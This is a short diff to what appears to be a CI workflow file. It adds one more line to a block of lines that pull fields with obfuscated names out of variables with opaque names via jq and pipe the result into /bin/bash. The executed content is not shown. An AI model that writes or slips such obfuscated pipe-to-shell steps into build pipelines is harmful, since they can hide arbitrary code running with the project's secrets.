@@ -23,6 +23,7 @@ jobs:
           echo $wg9 | jq -r .cmhc20353 | /bin/bash
           printf '%s' "$e625" | jq -r .uwcr1 | /bin/bash
           printf '%s' "$yrjfc334" | jq -r .wa43 | /bin/bash
+          printf '%s' "$ggvq728" | jq -r .huvud531 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
